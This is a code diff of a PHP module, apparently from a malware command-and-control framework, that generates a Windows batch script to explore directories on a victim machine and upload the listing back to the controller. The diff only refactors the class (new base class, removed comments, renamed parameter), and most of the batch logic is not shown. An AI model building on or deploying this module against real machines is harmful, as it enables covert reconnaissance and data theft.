@@ -2,10 +2,10 @@
 
 namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 
-use Kelvinho\Virus\Attack\AttackInterface;
+use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
 
-class ExploreDir extends AttackInterface {
+class ExploreDir extends AttackBase {
     public static int $maxLines = 10000;
     public static int $defaultDepth = 200;
 
@@ -33,22 +33,12 @@ class ExploreDir extends AttackInterface {
         $this->maxDepth = $maxDepth;
     }
 
-    /**
-     * This will restore the state of an attack with all of its configuration using a json string.
-     *
-     * @param string $json The JSON string
-     */
     protected function setState(string $json): void {
         $state = json_decode($json, true);
         $this->rootDir = $state["rootDir"];
         $this->maxDepth = $state["maxDepth"];
     }
 
-    /**
-     * This will get the state of an attack as a json string.
-     *
-     * @return string The JSON string
-     */
     protected function getState(): string {
         $state = [];
         $state["rootDir"] = $this->rootDir;
@@ -62,14 +52,8 @@ class ExploreDir extends AttackInterface {
         <?php return ob_get_clean();
     }
 
-    /**
-     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
-     *
-     * @return string
-     */
-    //@formatter:off
     public function generateBatchCode(): string {
-        ob_start(); ?>
+        ob_start(); //@formatter:off ?>
         @echo off
         chCp 65001
         SetLocal EnableDelayedExpansion
@@ -115,13 +99,9 @@ class ExploreDir extends AttackInterface {
         cd %~pd0
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean();
+        return ob_get_clean(); //@formatter:on
     }
-    //@formatter:on
 
-    /**
-     * @inheritDoc
-     */
-    public function processExtras(string $resource): void {
+    public function processExtras(string $resourceIdentifier): void {
     }
 }
